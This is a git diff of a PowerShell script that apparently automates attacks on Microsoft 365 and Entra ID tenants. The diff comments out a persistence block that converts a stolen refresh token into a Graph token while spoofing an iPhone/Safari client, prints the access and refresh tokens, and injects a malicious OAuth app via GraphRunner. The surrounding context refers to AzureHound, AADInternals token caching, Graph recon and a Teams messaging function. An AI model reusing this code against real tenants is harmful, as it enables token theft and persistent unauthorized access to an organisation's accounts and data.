@@ -119,32 +119,32 @@ if ($azureHound) {
     }
 }
 
-if ($persistence) {
-    try {
-        Write-Output "Injecting OAuth App for Persistence (Phirst.ps1)"
+# if ($persistence) {
+#     try {
+#         Write-Output "Injecting OAuth App for Persistence (Phirst.ps1)"
 
-        Start-Transcript -Path ".\PersistenceApps.log" -Append
-        $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari
+#         Start-Transcript -Path ".\PersistenceApps.log" -Append
+#         $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari
 
-        # Assuming $response is an object with access_token and refresh_token
-        if ($tokz) {
-            $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
-            # Output the tokens for verification (optional)
-            Write-Host "Access Token from tokens object: $($tokens.access_token)"
-            Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
-        }
-        . .\Modules\GraphRunner.ps1
-        Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
-        Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
-        Stop-Transcript
+#         # Assuming $response is an object with access_token and refresh_token
+#         if ($tokz) {
+#             $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
+#             # Output the tokens for verification (optional)
+#             Write-Host "Access Token from tokens object: $($tokens.access_token)"
+#             Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
+#         }
+#         . .\Modules\GraphRunner.ps1
+#         Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
+#         Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
+#         Stop-Transcript
 
-    catch {
-            Write-Error "An error occurred in the persistence block: $_"
-            # Optionally, you can exit the script here
-            # exit 1
-        }
-    }
-}
+#     catch {
+#             Write-Error "An error occurred in the persistence block: $_"
+#             # Optionally, you can exit the script here
+#             # exit 1
+#         }
+#     }
+# }
 
 
 if ($GraphRecon) {
@@ -208,9 +208,6 @@ Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.ref
 #         Content = $messageContent
 #     }
 # }
-
-
-
 
 ### Teams Messages - Function to handle message sending with retry logic
 function Send-TeamsMessageWithRetry {
@@ -276,7 +273,7 @@ if ($targetUser) {
 #         .\Modules\Inject-OAuthApp.ps1 -response $response -AppName $AppName -ReplyUrl $ReplyUrl -Scope $Scope 
 #     }
 #     catch {
-#         Write-Error "An error occurred in the AzureHound block: $_"
+#         Write-Error "An error occurred."
 #         # Optionally, you can exit the script here
 #         # exit 1
 #     }
